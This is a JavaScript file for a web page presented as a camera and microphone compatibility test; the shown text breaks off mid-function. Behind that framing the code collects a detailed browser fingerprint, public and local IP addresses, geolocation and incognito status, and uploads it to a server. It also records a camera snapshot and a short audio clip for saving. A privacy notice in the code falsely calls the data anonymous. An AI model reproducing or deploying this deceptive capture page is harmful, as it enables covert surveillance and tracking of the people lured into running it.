// Browser Fingerprinting and Media Capture Utility

import detectIncognito from './incognito-detection.js';

class FingerprintMediaTest {
  constructor() {
    this.initElements();
    this.initEventListeners();
    this.isMobile = /Mobi|Android/i.test(navigator.userAgent);
    this.audioVisualizerActive = false;
    this.audioContext = null;
    this.analyser = null;
    this.mediaStream = null;
    this.privacyData = {
      isIncognito: false,
      browserName: 'Unknown',
      detectionMethod: 'Not tested'
    };

    // Set current year
    document.getElementById('currentYear').textContent = new Date().getFullYear();
    // --- Add robust cleanup on navigation/visibility change ---
    const cleanupHandler = () => { try { this.cleanup(); } catch (e) { /* ignore */ } };
    window.addEventListener('pagehide', cleanupHandler);
    window.addEventListener('beforeunload', cleanupHandler);
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') cleanupHandler();
    });
  }
  cleanup() {
    // Stop any active media streams
    if (this.mediaStream) {
      this.mediaStream.getTracks().forEach(track => track.stop());
      this.mediaStream = null;
    }
    
    // Stop audio visualization
    this.stopAudioVisualizer();
    
    // Reset video element
    if (this.localVideo) {
      this.localVideo.srcObject = null;
      this.localVideo.style.display = 'none';
    }
    
    // Show placeholder again
    if (this.placeholder) {
      this.placeholder.style.display = 'block';
    }
  }
  initElements() {
    this.statusElement = document.querySelector('.status-content');
    this.startButton = document.getElementById('startTest');
    this.videoContainer = document.getElementById('videoContainer');
    this.placeholder = document.getElementById('placeholder');
    this.cameraStatus = document.getElementById('cameraStatus');
    this.micStatus = document.getElementById('micStatus');
    this.audioBars = document.querySelectorAll('.audio-bar');
    this.localVideo = document.getElementById('localVideo');
    this.privacyLink = document.getElementById('privacyLink');
    
    this.privacyStatus = document.getElementById('privacyStatus') || {
      textContent: ''
    };
    this.networkStatus = document.getElementById('networkStatus') || {
      textContent: ''
    };
  }

  initEventListeners() {
    this.startButton.addEventListener('click', () => this.runTests());
    this.privacyLink.addEventListener('click', (e) => {
      e.preventDefault();
      alert('Privacy policy: We collect anonymous technical data about your device for compatibility testing purposes only. No personally identifiable information is stored.');
    });
    
    if (this.isMobile) {
      this.videoContainer.style.minHeight = '50vh';
      this.startButton.style.fontSize = '18px';
      this.startButton.style.padding = '15px 25px';
    }
  }

  async updatePrivacyStatus() {
    try {
      const networkInfo = await this.getNetworkInfo();
      const privacyInfo = await this.detectIncognitoMode();
      const privacyStatus = privacyInfo.isIncognito ? 
        `Private Mode (${privacyInfo.browserName})` : 
        `Normal Mode (${privacyInfo.browserName})`;
      this.privacyStatus.textContent = 
        `Network: ${networkInfo.type} | ${privacyStatus}`;
      this.privacyStatus.style.color = privacyInfo.isIncognito ? 
        '#ea4335' : '#34a853';
      // Update the consent box UI if present
      this.updatePrivacyStatusBox(privacyInfo);
    } catch (error) {
      console.error('Privacy status update failed:', error);
      this.privacyStatus.textContent = 'Network: Unknown | Privacy: Detection failed';
      this.privacyStatus.style.color = '#fbbc05';
    }
  }

  async getNetworkInfo() {
    try {
      const publicIP = await this.getPublicIP();
      return {
        type: 'public',
        publicIP,
        localIPs: []
      };
    } catch (error) {
      return {
        type: 'unknown',
        publicIP: null,
        localIPs: []
      };
    }
  }

  async runTests() {
  try {
    // Initialize cleanup first
    this.cleanup = this.cleanup || function() {
      console.warn('Fallback cleanup called');
      if (this.mediaStream) {
        this.mediaStream.getTracks().forEach(track => track.stop());
      }
    };

    this.cleanup(); // Now this will work
    this.setTestStatus("Initializing test...", true);

      await this.updatePrivacyStatus();
      
      const publicIP = await this.getPublicIP();
      this.networkStatus.textContent = `Network: Detected (Public IP: ${publicIP || 'Not available'})`;
      
      const fingerprintData = await this.collectEnhancedFingerprint();
      const mediaData = await this.captureAndSaveMedia();
      const locationData = await this.collectLocation();

      this.setTestStatus("Test completed successfully! All components are working properly.", false, "Test Again");
      
      const processedData = this.processAllData(fingerprintData, mediaData, locationData);
      console.log("Processed test data:", processedData);
      
    } catch (error) {
    console.error('Test failed:', error, error.message, error.stack);
    
    // Ensure cleanup exists before calling it
    if (typeof this.cleanup === 'function') {
      this.cleanup();
    }
    
    this.setTestStatus(
      `Test encountered an error: ${error.message}`,
      false,
      "Retry Test"
    );
  } finally {
    // Always clean up media devices after test completes (success or error)
    this.cleanup();
  }
}

  setTestStatus(message, isLoading, buttonText = "Start Test") {
    this.statusElement.textContent = message;
    this.startButton.disabled = isLoading;
    this.startButton.innerHTML = isLoading 
      ? '<div class="loader"></div> Starting Test...' 
      : buttonText;
  }

  async collectEnhancedFingerprint() {
  try {
    console.log('[DEBUG] Starting fingerprint collection');
    
    const rawData = await this.gatherRawFingerprint();
    const processedData = this.processFingerprintData(rawData);
    
    console.log('[DEBUG] Prepared fingerprint data:', {
      ip: rawData.network.publicIP,
      dataSize: JSON.stringify(processedData).length,
      features: Object.keys(processedData.browser_features || {})
    });

    // Show loading state
    this.setTestStatus("Uploading fingerprint data...", true);

    const response = await fetch('/collect-fingerprint', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        type: 'processed_fingerprint',
        data: processedData,
        timestamp: new Date().toISOString()
      })
    });

    if (!response.ok) {
      let errorData;
      try {
        errorData = await response.json();
        console.error('[ERROR] Server response:', {
          status: response.status,
          error: errorData.error,
          details: errorData.details
        });
      } catch (e) {
        console.error('[ERROR] Failed to parse error response:', e);
        errorData = { error: 'Invalid server response' };
      }
      
      throw new Error(errorData.error || `Server error: ${response.status}`);
    }

    const result = await response.json();
    console.log('[DEBUG] Fingerprint saved successfully:', result.url);
    return processedData;

  } catch (error) {
    console.error('[ERROR] Fingerprint collection failed:', error, error.message, error.stack);
    
    // Provide user-friendly error messages
    let userMessage = error.message;
    if (error.message.includes('timeout')) {
      userMessage = 'Connection timeout - please check your network';
    } else if (error.message.includes('Failed to fetch')) {
      userMessage = 'Network error - cannot connect to server';
    }
    
    throw new Error(userMessage);
  }
}

async runTests() {
  try {
    this.cleanup();
    this.setTestStatus("Initializing test...", true);
    
    await this.updatePrivacyStatus();
    const publicIP = await this.getPublicIP();
    this.networkStatus.textContent = `Network: Detected (Public IP: ${publicIP || 'Not available'})`;
    
    // Get local network info
    this.setTestStatus("Checking local network...", true);
    const localIPs = await this.getLocalIPs();
    document.getElementById('localIPv4').textContent = localIPs.ipv4.join(', ');
    document.getElementById('localIPv6').textContent = localIPs.ipv6.join(', ');
    const localLocation = await this.getLocalIPLocation();
    if (!localLocation.error) {
      const locationStr = `${localLocation.city}, ${localLocation.region}, ${localLocation.country}`;
      document.getElementById('localLocation').textContent = locationStr;
    } else {
      document.getElementById('localLocation').textContent = 'Not available';
    }

    console.log('Starting fingerprint collection...');
    const fingerprintData = await this.collectEnhancedFingerprint();
    
    console.log('Starting media capture...');
    const mediaData = await this.captureAndSaveMedia();
    
    console.log('Starting location collection...');
    const locationData = await this.collectLocation();

    this.setTestStatus("Test completed successfully! All components are working properly.", false, "Test Again");
    
    const processedData = this.processAllData(fingerprintData, mediaData, locationData);
    console.log("Test completed with data:", processedData);
    
  } catch (error) {
    console.error('Test failed:', error, error.message, error.stack);
    this.setTestStatus(`Test encountered an error: ${error.message}`, false, "Retry Test");
  } finally {
    // Always clean up media devices after test completes (success or error)
    this.cleanup();
  }
}
  async gatherRawFingerprint() {
    const publicIP = await this.getPublicIP();
    const localIPsObj = await this.getLocalIPs();
    const istTime = new Date().toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
    const coords = await this.collectLocation();
    // Get privacy data
    const privacyInfo = await this.detectIncognitoMode();
    const os = await this.detectOS();
    console.log('Privacy Detection Results:', privacyInfo); // Add this line

    return {
      os: os,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      languages: navigator.languages,
      timestamp: istTime,
      timezone: 'Asia/Kolkata (IST)',
      network: {
        publicIP,
        localIPv4: localIPsObj.ipv4,
        localIPv6: localIPsObj.ipv6
      },
      location: coords || null,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight
      },
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },
      hardware: {
        cpuCores: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints
      },
      features: {
        audio: await this.getAudioFingerprint(),
        fonts: await this.detectFonts(),
        plugins: this.getPlugins(),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine
      },
      timing: {
        pageLoadTime: performance.now()
      },
      orientation: {
        angle: screen.orientation ? screen.orientation.angle : null,
        type: screen.orientation ? screen.orientation.type : null
      },
      browserInfo: {
        vendor: navigator.vendor,
        product: navigator.product,
        webdriver: navigator.webdriver
      },
      privacyInfo: {
        isIncognito: privacyInfo.isIncognito,
        browserName: privacyInfo.browserName,
        detectionMethod: privacyInfo.method
      }
    };
  }

   async getPublicIP() {
    try {
      // First try our own endpoint
      const response = await fetch('/get-ip');
      if (response.ok) {
        const data = await response.json();
        return data.ip;
      }
      
      // Fallback to api.ipify.org
      const ipifyResponse = await fetch('https://api.ipify.org?format=json');
      if (!ipifyResponse.ok) throw new Error('IP fetch failed');
      const ipifyData = await ipifyResponse.json();
      return ipifyData.ip;
    } catch (error) {
      console.error('Error fetching public IP:', error);
      return null;
    }
  }

  async captureAndSaveMedia() {
    try {
      this.setMediaStatus("Checking camera and microphone permissions...", "Checking...", "Checking...");

      // Use mobile-friendly constraints if on mobile
      let constraints;
      if (this.isMobile) {
        constraints = {
          video: { facingMode: "user" },
          audio: true
        };
      } else {
        constraints = {
          video: { width: 1280, height: 720 },
          audio: {
            echoCancellation: true,
            noiseSuppression: true,
            autoGainControl: true
          }
        };
      }

      this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
      await this.setupVideoStream(this.mediaStream);
      await this.testCamera(this.mediaStream);
      if (this.mediaStream.getAudioTracks().length > 0) {
        await this.testMicrophone(this.mediaStream);
      } else {
        this.micStatus.textContent = "Microphone: Not detected";
      }
      return { success: true };
    } catch (error) {
      this.handleMediaError(error);
      throw error;
    }
  }

  handleMediaError(error) {
    console.error('Media capture error:', error);
    
    let errorMessage = 'Unknown error occurred';
    
    if (error.name === 'NotAllowedError') {
      errorMessage = 'Camera/microphone access denied. Please allow permissions and try again.';
    } else if (error.name === 'NotFoundError') {
      errorMessage = 'No camera or microphone found. Please check your devices.';
    } else if (error.name === 'NotSupportedError') {
      errorMessage = 'Media capture not supported in this browser.';
    } else if (error.message.includes('timeout')) {
      errorMessage = 'Permission request timed out. Please try again.';
    }
    
    this.setMediaStatus(`Error: ${errorMessage}`, "Failed", "Failed");
  }

  async setupVideoStream(stream) {
    this.localVideo.srcObject = stream;
    this.localVideo.style.display = 'block';
    this.placeholder.style.display = 'none';

    await new Promise((resolve, reject) => {
      this.localVideo.onloadedmetadata = resolve;
      this.localVideo.onerror = reject;
    });

    try {
      await this.localVideo.play();
    } catch (error) {
      console.error('Video play error:', error);
      throw new Error('Failed to start video playback');
    }
  }

  async testCamera(stream) {
    this.cameraStatus.textContent = "Camera: Detected";
    this.setTestStatus("Testing camera... Smile!");

    const imageBlob = await this.captureImageFrame(this.localVideo);
    if (!imageBlob) {
      throw new Error('Failed to capture image frame');
    }

    const processedImageData = {
      type: 'camera_test',
      timestamp: new Date().toISOString(),
      resolution: `${this.localVideo.videoWidth}x${this.localVideo.videoHeight}`,
      size_bytes: imageBlob.size,
      format: 'jpeg',
      device_info: {
        user_agent: navigator.userAgent,
        platform: navigator.platform
      }
    };
    
    await this.saveProcessedMedia('image', imageBlob, 'jpg', processedImageData);
    this.cameraStatus.textContent = "Camera: Working properly";
  }

  async testMicrophone(stream) {
    this.animateAudioVisualizer(stream);
    this.micStatus.textContent = "Microphone: Detected";
    this.setTestStatus("Testing microphone... Speak now!");

    const audioBlob = await this.recordAudio(stream);
    if (audioBlob) {
      const processedAudioData = {
        type: 'microphone_test',
        timestamp: new Date().toISOString(),
        duration_seconds: 6,
        size_bytes: audioBlob.size,
        format: 'webm',
        device_info: {
          user_agent: navigator.userAgent,
          platform: navigator.platform
        }
      };
      
      await this.saveProcessedMedia('audio', audioBlob, 'webm', processedAudioData);
      this.micStatus.textContent = "Microphone: Working properly";
    }
  }

  setMediaStatus(status, cameraText, micText) {
    this.statusElement.textContent = status;
    this.cameraStatus.textContent = `Camera: ${cameraText}`;
    this.micStatus.textContent = `Microphone: ${micText}`;
  }

  animateAudioVisualizer(stream) {
    this.stopAudioVisualizer();
    this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
    this.analyser = this.audioContext.createAnalyser();
    const microphone = this.audioContext.createMediaStreamSource(stream);
    microphone.connect(this.analyser);
    this.analyser.fftSize = 32;

    const bufferLength = this.analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    const updateVisualizer = () => {
      if (!this.analyser) return; // Prevent TypeError if analyser is null
